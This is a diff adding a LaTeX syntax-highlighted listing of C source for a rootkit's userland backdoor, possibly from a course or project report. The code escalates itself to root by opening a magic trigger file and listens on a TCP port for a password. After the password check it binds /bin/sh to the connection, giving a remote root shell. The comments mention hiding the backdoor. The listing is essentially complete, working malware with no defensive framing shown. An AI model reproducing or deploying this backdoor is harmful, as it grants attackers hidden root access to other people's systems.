@@ -1,0 +1,95 @@
+\begin{Verbatim}[commandchars=\\\{\}]
+\PYG{c+cm}{/**}
+\PYG{c+cm}{ * Escalates the backdoor process to root by touching super secret file.}
+\PYG{c+cm}{ */}
+\PYG{k+kt}{void} \PYG{n+nf}{obtain\PYGZus{}root}\PYG{p}{(}\PYG{k+kt}{void}\PYG{p}{)} \PYG{p}{\PYGZob{}}
+
+    \PYG{c+c1}{// Get root for current process.}
+    \PYG{k+kt}{int} \PYG{n}{fd} \PYG{o}{=} \PYG{n}{open}\PYG{p}{(}\PYG{n}{SUPER\PYGZus{}SECRET\PYGZus{}KEY}\PYG{l+s}{\PYGZdq{}\PYGZhy{}\PYGZdq{}}\PYG{n}{GET\PYGZus{}ROOT}\PYG{p}{,} \PYG{n}{O\PYGZus{}RDWR}\PYG{p}{,} \PYG{l+m+mi}{0}\PYG{p}{);}
+    \PYG{n}{close}\PYG{p}{(}\PYG{n}{fd}\PYG{p}{);}
+\PYG{p}{\PYGZcb{}}
+
+\PYG{c+cm}{/**}
+\PYG{c+cm}{ * Starts listening on localhost on PORT for commands to send to the rootkit.}
+\PYG{c+cm}{ */}
+\PYG{k+kt}{void} \PYG{n+nf}{listen\PYGZus{}for\PYGZus{}commands}\PYG{p}{(}\PYG{k+kt}{void}\PYG{p}{)} \PYG{p}{\PYGZob{}}
+
+    \PYG{c+c1}{// Try to create a new socket, exit if we fail to do so.}
+    \PYG{k+kt}{int} \PYG{n}{listen\PYGZus{}fd} \PYG{o}{=} \PYG{n}{socket}\PYG{p}{(}\PYG{n}{AF\PYGZus{}INET}\PYG{p}{,} \PYG{n}{SOCK\PYGZus{}STREAM}\PYG{p}{,} \PYG{l+m+mi}{0}\PYG{p}{);}
+    \PYG{k}{if} \PYG{p}{(}\PYG{n}{listen\PYGZus{}fd} \PYG{o}{\PYGZlt{}} \PYG{l+m+mi}{0}\PYG{p}{)} \PYG{n}{exit}\PYG{p}{(}\PYG{l+m+mi}{1}\PYG{p}{);}
+
+    \PYG{c+c1}{// Create a new socket address, 0 it out and then initialise.}
+    \PYG{k}{struct} \PYG{n}{sockaddr\PYGZus{}in} \PYG{n}{s\PYGZus{}addr}\PYG{p}{;}
+    \PYG{n}{memset}\PYG{p}{(}\PYG{o}{\PYGZam{}}\PYG{n}{s\PYGZus{}addr}\PYG{p}{,} \PYG{l+m+mi}{0}\PYG{p}{,} \PYG{k}{sizeof}\PYG{p}{(}\PYG{n}{s\PYGZus{}addr}\PYG{p}{));}
+    \PYG{n}{s\PYGZus{}addr}\PYG{p}{.}\PYG{n}{sin\PYGZus{}family}      \PYG{o}{=} \PYG{n}{AF\PYGZus{}INET}\PYG{p}{;}
+    \PYG{n}{s\PYGZus{}addr}\PYG{p}{.}\PYG{n}{sin\PYGZus{}addr}\PYG{p}{.}\PYG{n}{s\PYGZus{}addr} \PYG{o}{=} \PYG{n}{htonl}\PYG{p}{(}\PYG{n}{INADDR\PYGZus{}ANY}\PYG{p}{);}
+    \PYG{n}{s\PYGZus{}addr}\PYG{p}{.}\PYG{n}{sin\PYGZus{}port}        \PYG{o}{=} \PYG{n}{htons}\PYG{p}{(}\PYG{n}{PORT}\PYG{p}{);}
+
+    \PYG{c+c1}{// Bind our socket to its address, exit if we fail to do so.}
+    \PYG{k}{if} \PYG{p}{(}\PYG{n}{bind}\PYG{p}{(}\PYG{n}{listen\PYGZus{}fd}\PYG{p}{,} \PYG{p}{(}\PYG{k}{struct} \PYG{n}{sockaddr} \PYG{o}{*}\PYG{p}{)}\PYG{o}{\PYGZam{}}\PYG{n}{s\PYGZus{}addr}\PYG{p}{,} \PYG{k}{sizeof}\PYG{p}{(}\PYG{n}{s\PYGZus{}addr}\PYG{p}{))} \PYG{o}{\PYGZlt{}} \PYG{l+m+mi}{0}\PYG{p}{)} \PYG{n}{exit}\PYG{p}{(}\PYG{l+m+mi}{1}\PYG{p}{);}
+
+    \PYG{c+c1}{// Start listening on our socket, exit if we fail to do so.}
+    \PYG{k}{if} \PYG{p}{(}\PYG{n}{listen}\PYG{p}{(}\PYG{n}{listen\PYGZus{}fd}\PYG{p}{,} \PYG{l+m+mi}{5}\PYG{p}{)} \PYG{o}{\PYGZlt{}} \PYG{l+m+mi}{0}\PYG{p}{)} \PYG{n}{exit}\PYG{p}{(}\PYG{l+m+mi}{1}\PYG{p}{);}
+
+    \PYG{k+kt}{int} \PYG{n}{i}\PYG{p}{,} \PYG{n}{connfd}\PYG{p}{;}
+    \PYG{k+kt}{pid\PYGZus{}t} \PYG{n}{pid}\PYG{p}{;}
+    \PYG{k+kt}{char} \PYG{n}{buf}\PYG{p}{[}\PYG{n}{MAXLINE}\PYG{p}{];}
+    \PYG{k}{struct} \PYG{n}{sockaddr\PYGZus{}in} \PYG{n}{c\PYGZus{}addr}\PYG{p}{;}
+    \PYG{k+kt}{socklen\PYGZus{}t} \PYG{n}{c\PYGZus{}size} \PYG{o}{=} \PYG{k}{sizeof}\PYG{p}{(}\PYG{n}{c\PYGZus{}addr}\PYG{p}{);}
+
+    \PYG{c+c1}{// Listen indefinitely for commands.}
+    \PYG{k}{while}\PYG{p}{(}\PYG{l+m+mi}{1}\PYG{p}{)} \PYG{p}{\PYGZob{}}
+        \PYG{n}{connfd} \PYG{o}{=} \PYG{n}{accept}\PYG{p}{(}\PYG{n}{listen\PYGZus{}fd}\PYG{p}{,} \PYG{p}{(}\PYG{k}{struct} \PYG{n}{sockaddr} \PYG{o}{*}\PYG{p}{)}\PYG{o}{\PYGZam{}}\PYG{n}{c\PYGZus{}addr}\PYG{p}{,} \PYG{o}{\PYGZam{}}\PYG{n}{c\PYGZus{}size}\PYG{p}{);}
+        \PYG{k}{if}\PYG{p}{((}\PYG{n}{pid} \PYG{o}{=} \PYG{n}{fork}\PYG{p}{())} \PYG{o}{==} \PYG{l+m+mi}{0}\PYG{p}{)} \PYG{p}{\PYGZob{}}
+
+            \PYG{c+c1}{// If child process creates its own child process, end it.}
+            \PYG{k}{if}\PYG{p}{((}\PYG{n}{pid} \PYG{o}{=} \PYG{n}{fork}\PYG{p}{())} \PYG{o}{\PYGZgt{}} \PYG{l+m+mi}{0}\PYG{p}{)} \PYG{p}{\PYGZob{}}
+                \PYG{n}{exit}\PYG{p}{(}\PYG{l+m+mi}{0}\PYG{p}{);}
+            \PYG{c+c1}{// Otherwise deal with the incoming connection.}
+            \PYG{c+c1}{// For now we do not offer any interaction w/ the kit \PYGZhy{} just}
+            \PYG{c+c1}{// getting a root shell.}
+            \PYG{p}{\PYGZcb{}} \PYG{k}{else} \PYG{k}{if}\PYG{p}{(}\PYG{o}{!}\PYG{n}{pid}\PYG{p}{)} \PYG{p}{\PYGZob{}}
+
+                \PYG{n}{close}\PYG{p}{(}\PYG{n}{listen\PYGZus{}fd}\PYG{p}{);}
+
+                \PYG{c+c1}{// Print out greeting from guard kitten and await response.}
+                \PYG{k+kt}{char} \PYG{o}{*}\PYG{n}{s} \PYG{o}{=} \PYG{l+s}{\PYGZdq{}Kittens only!}\PYG{l+s+se}{\PYGZbs{}n}\PYG{l+s}{\PYGZdq{}}\PYG{p}{;}
+                \PYG{n}{write}\PYG{p}{(}\PYG{n}{connfd}\PYG{p}{,} \PYG{n}{s}\PYG{p}{,} \PYG{n}{strlen}\PYG{p}{(}\PYG{n}{s}\PYG{p}{));}
+                \PYG{n}{memset}\PYG{p}{(}\PYG{n}{buf}\PYG{p}{,}\PYG{l+m+mi}{0}\PYG{p}{,} \PYG{n}{MAXLINE}\PYG{p}{);}
+                \PYG{n}{read}\PYG{p}{(}\PYG{n}{connfd}\PYG{p}{,} \PYG{n}{buf}\PYG{p}{,} \PYG{n}{MAXLINE}\PYG{p}{);}
+
+                \PYG{c+c1}{// If passcode is incorrect, exit.}
+                \PYG{k}{if} \PYG{p}{(}\PYG{n}{strncmp}\PYG{p}{(}\PYG{n}{buf}\PYG{p}{,}\PYG{n}{PASSWD}\PYG{p}{,}\PYG{n}{strlen}\PYG{p}{(}\PYG{n}{PASSWD}\PYG{p}{))} \PYG{o}{!=}\PYG{l+m+mi}{0}\PYG{p}{)\PYGZob{}}
+                    \PYG{n}{close}\PYG{p}{(}\PYG{n}{connfd}\PYG{p}{);}
+                    \PYG{n}{exit}\PYG{p}{(}\PYG{l+m+mi}{0}\PYG{p}{);}
+                \PYG{c+c1}{// Otherwise, congratulate them and give them a root shell. :\PYGZca{})}
+                \PYG{p}{\PYGZcb{}}\PYG{k}{else} \PYG{p}{\PYGZob{}}
+                    \PYG{n}{s} \PYG{o}{=} \PYG{l+s}{\PYGZdq{}Me\PYGZhy{}wow! Have a shell.}\PYG{l+s+se}{\PYGZbs{}n}\PYG{l+s}{\PYGZdq{}}\PYG{p}{;}
+                    \PYG{n}{write}\PYG{p}{(}\PYG{n}{connfd}\PYG{p}{,} \PYG{n}{s}\PYG{p}{,} \PYG{n}{strlen}\PYG{p}{(}\PYG{n}{s}\PYG{p}{));}
+
+                    \PYG{n}{dup2}\PYG{p}{(}\PYG{n}{connfd}\PYG{p}{,}\PYG{l+m+mi}{0}\PYG{p}{);}
+                    \PYG{n}{dup2}\PYG{p}{(}\PYG{n}{connfd}\PYG{p}{,}\PYG{l+m+mi}{1}\PYG{p}{);}
+                    \PYG{n}{dup2}\PYG{p}{(}\PYG{n}{connfd}\PYG{p}{,}\PYG{l+m+mi}{2}\PYG{p}{);}
+                    \PYG{n}{execl}\PYG{p}{(}\PYG{l+s}{\PYGZdq{}/bin/sh\PYGZdq{}}\PYG{p}{,} \PYG{l+s}{\PYGZdq{}/bin/sh\PYGZdq{}}\PYG{p}{,} \PYG{p}{(}\PYG{k+kt}{char} \PYG{o}{*}\PYG{p}{)} \PYG{l+m+mi}{0}\PYG{p}{);}
+                \PYG{p}{\PYGZcb{}}
+            \PYG{p}{\PYGZcb{}}
+        \PYG{p}{\PYGZcb{}}\PYG{k}{else} \PYG{k}{if}\PYG{p}{(}\PYG{n}{pid} \PYG{o}{\PYGZgt{}} \PYG{l+m+mi}{0}\PYG{p}{)\PYGZob{}}
+            \PYG{n}{close}\PYG{p}{(}\PYG{n}{connfd}\PYG{p}{);}
+
+            \PYG{c+c1}{// Wait for child process}
+            \PYG{k}{if} \PYG{p}{(}\PYG{n}{waitpid}\PYG{p}{(}\PYG{n}{pid}\PYG{p}{,} \PYG{n+nb}{NULL}\PYG{p}{,} \PYG{l+m+mi}{0}\PYG{p}{)} \PYG{o}{!=} \PYG{n}{pid}\PYG{p}{)} \PYG{n}{exit}\PYG{p}{(}\PYG{l+m+mi}{1}\PYG{p}{);}
+        \PYG{p}{\PYGZcb{}}\PYG{k}{else} \PYG{p}{\PYGZob{}}
+            \PYG{n}{exit}\PYG{p}{(}\PYG{l+m+mi}{1}\PYG{p}{);}
+        \PYG{p}{\PYGZcb{}}
+    \PYG{p}{\PYGZcb{}}
+\PYG{p}{\PYGZcb{}}
+
+\PYG{k+kt}{int} \PYG{n+nf}{main}\PYG{p}{(}\PYG{k+kt}{int} \PYG{n}{argc}\PYG{p}{,} \PYG{k+kt}{char} \PYG{o}{*}\PYG{n}{argv}\PYG{p}{[])} \PYG{p}{\PYGZob{}}
+
+    \PYG{c+c1}{// Get root for current process and hide the backdoor.}
+    \PYG{n}{obtain\PYGZus{}root}\PYG{p}{();}
+
+    \PYG{c+c1}{// Then listen for commands.}
+    \PYG{n}{listen\PYGZus{}for\PYGZus{}commands}\PYG{p}{();}
+\PYG{p}{\PYGZcb{}}
+\end{Verbatim}
